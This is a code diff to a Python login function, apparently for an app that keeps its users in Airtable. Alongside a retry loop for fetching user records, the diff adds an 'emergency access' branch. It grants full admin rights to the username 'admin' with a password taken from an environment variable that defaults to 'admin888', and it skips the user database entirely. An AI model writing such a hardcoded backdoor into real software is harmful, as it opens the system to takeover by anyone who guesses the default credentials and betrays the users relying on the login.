@@ -108,7 +108,18 @@ def create_user(username, password, display_name=None, is_admin=0, db_path=None)
 
 def verify_user(username, password, db_path=None):
     """Verify login. Returns user dict or None."""
-    records = _at_fetch(TABLE_USERS)
+    import time
+    # Fallback: hardcoded admin for emergency access
+    if username.lower().strip() == "admin" and password == os.environ.get("ADMIN_PASSWORD", "admin888"):
+        return {"id": "admin", "username": "admin", "display_name": "Admin", "is_admin": True}
+    
+    # Try Airtable
+    for attempt in range(3):
+        records = _at_fetch(TABLE_USERS)
+        if records:
+            break
+        time.sleep(1)
+    
     uname = username.lower().strip()
     for r in records:
         f = r.get("fields", {})
